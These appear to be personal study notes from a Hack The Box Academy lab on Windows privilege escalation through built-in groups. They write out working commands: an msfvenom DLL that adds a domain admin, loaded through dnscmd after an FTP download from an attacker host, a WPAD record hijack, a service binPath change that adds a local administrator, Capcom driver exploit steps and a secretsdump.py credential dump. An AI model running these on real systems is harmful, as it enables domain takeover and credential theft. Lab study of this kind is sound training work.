
>[!NOTE]
> How to add individual to the group 
## Group Privileges
- Built-in groups are groups that are shipped with the operating system or get added when active directory domain services role is installed on system to promote a server to a Domain Controller
#### Event Log Reader

```Powershell
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```
```
|Get-WinEvent -LogName security \| where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} \| Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```


==need to get more info==
#### DNSAdmins Group

**Checks whether you are part of the group** 
```
Get-ADGroupMember -Identity DnsAdmins

```

**Creating and executing payload** 
```bash  
#Create payload 
//[!question] help 
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll <----

#Start local ftp server 
host@hostmachine> sudo python3 -m pip install pyftpdlib 

host@hostmachine > sudo python3 -m pyftpdlib --port 21 -u user -P pass

C:\htb> ftp 10.10.10.1 

C:\htb> get adduser.dll

C:\htb> dnscmd.exe /config /serverlevelplugindll C:\Path\to\adduser <-------------------



```

*Finding SID 
```
(Get-LocalUser -Name "netadm").SID

sc.exe sdshow DNS 

```


**Restarting DNS Process** 
Confirm Key Is Added:LiArrowBigRight: Remove Key :LiArrowBigRight: Start Service Again 
```
C:\Windows\System32> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

C:\Windows\System32> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

sc.exe start dns 
```

**WPAD Record**: A method used by clients to locate URI of a configuration file using DHCP and/or DNS discovery methods 
```Powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
```
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```

- for some reason sc.exe query dns works well but sc query dns does not work 

> [!NOTE] Title
>  Recommended to use CMD, not powershell 
>  Recs also include using net start and net stop instead of sc.exe start dns https://forum.hackthebox.com/t/htb-academy-windows-privilege-escalation-dnsadmins/243482/31

####  Hyper-V Administrators

- have access to all hyper v features 
- if domain controllers have been virtualized, then virtualization admins should be considered domain admins 
- deleting virtual machine attempts to restore original file permissions on corresponding .vhdx file 
#### Print Operators
- Grants SeLoadDriverPrivilege, which is ability to to administer/connect/disconnect printers as well as login to domain controller



> [!NOTE]
> 1. Download tool to enable privilege (https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)
> 2. Compile privilege using cl.exe from visual studio 
> 3. Downloadcapcom.sys file  to ``C:\temp``
> 4. Add reference to drive 
> 5. Check to make sure capcom driver is not loaded
> 6. Check it has been enabled 
> 7. Launch exploit using exploitcapcom.exe

####  Server Operators 
- Grants SeBackupPrivilege and SeRestorePrivilege 
- SeBackupPrivilege

**Enumeration**
```
sc qc AppReadiness 
```

```Powershell
Get-Service -Name AppReadiness | Select-Object *

```

```Powershell
c:\Tools\PsService.exe security AppReadiness 

```
Payload/Priv Esc
> [!NOTE] Payload Consideration
> All of what is mentioned below is REQUIRED to get this to work, none of it is not important 

```
sc config AppReadiness binPath="cmd /c net localgroup Administrators server_adm /add"
sc start AppReadinesss 
net localgroup Administrators 

```

- AppReadiness is misconfigured to allow Server Operators full control and let them change how a service starts 
-  ONly possible if someon has service_all_access
**Data Exfilitration**
```bash
secretsdump.py server_adm@10.129.43.42
```
